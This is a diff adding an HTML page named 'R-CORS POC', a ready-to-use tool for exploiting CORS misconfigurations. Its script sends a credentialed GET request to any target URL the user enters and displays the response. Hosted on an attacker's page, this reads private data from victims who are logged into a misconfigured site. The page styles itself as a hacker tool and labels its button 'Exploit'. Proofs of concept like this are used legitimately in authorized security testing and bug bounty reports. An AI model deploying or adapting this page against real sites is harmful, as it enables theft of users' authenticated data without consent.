@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>R-CORS POC</title>
+    <link rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+    <style>
+        body {
+            background-color: #111;
+            color: #24ff24;
+            font-family: 'Fira Mono', 'Courier New', monospace;
+            text-align: center;
+            padding: 50px;
+        }
+        h1, h3 {
+            color: #24ff24;
+            text-shadow: 0 0 5px #39ff14;
+        }
+        em {
+            color: #7CFC00;
+            font-style: italic;
+            display: block;
+            margin-bottom: 20px;
+            font-size: 1.06em;
+            text-shadow: 0 0 2px #39ff14;
+        }
+        .btn-hacker {
+            background: #000;
+            color: #39ff14;
+            border: 2px solid #39ff14;
+            border-radius: 8px;
+            padding: 15px 40px;
+            font-size: 1.3em;
+            font-family: inherit;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: background 0.2s, color 0.2s;
+            box-shadow: 0 0 12px #24ff24;
+        }
+        .btn-hacker:hover {
+            background: #24ff24;
+            color: #000;
+        }
+        .input-hacker {
+            background: #191919;
+            color: #39ff14;
+            border: 2px solid #39ff14;
+            border-radius: 8px;
+            padding: 10px 15px;
+            font-size: 1.1em;
+            font-family: inherit;
+            margin-bottom: 18px;
+            outline: none;
+            width: 400px;
+        }
+        .output-area {
+            background: #181818;
+            color: #20ff20;
+            border: 1px solid #39ff14;
+            border-radius: 10px;
+            margin: 27px auto 0 auto;
+            padding: 18px;
+            width: 90%;
+            max-width: 700px;
+            min-height: 60px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            font-size: 1.05em;
+            text-align: left;
+            box-shadow: 0 0 16px #24ff24;
+        }
+        .social-link {
+            display: inline-block;
+            margin-top: 30px;
+            color: #24ff24;
+            text-decoration: none;
+            font-size: 1.1em;
+            border: 1px solid #39ff14;
+            border-radius: 6px;
+            padding: 9px 18px;
+            box-shadow: 0 0 8px #39ff14;
+        }
+        .social-link i {
+            margin-right: 7px;
+        }
+    </style>
+</head>
+<body>
+    <h1>R-CORS POC</h1>
+    <em>
+        Cross-Origin Resource Sharing (CORS) is a security mechanism that allows a web page to make requests for resources from a different domain, under strict rules enforced by the browser and the target server.
+    </em>
+    <h3>Extract Data</h3>
+    <input class="input-hacker" id="targetURL" placeholder="Enter target URL (e.g. https://domain.com/path)" />
+    <br>
+    <button class="btn-hacker" type="button" onclick="cors()">Exploit</button>
+    <div id="output" class="output-area"></div>
+    <a class="social-link" href="https://www.linkedin.com/in/rivektamang/" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>Rivek Raj Tamang
+    </a>
+    <script>
+    function cors() {
+        var url = document.getElementById('targetURL').value;
+        var output = document.getElementById('output');
+        if(!url) {
+            output.textContent = "Please enter a target URL.";
+            return;
+        }
+        output.textContent = "Sending request to: " + url + " ...";
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (this.readyState == 4) {
+                if(this.status == 200) {
+                    output.textContent = this.responseText;
+                } else {
+                    output.textContent = "Error: Status " + this.status + " (" + this.statusText + ")";
+                }
+            }
+        };
+        xhr.open("GET", url, true);
+        xhr.withCredentials = true;
+        xhr.send();
+    }
+    </script>
+</body>
+</html>
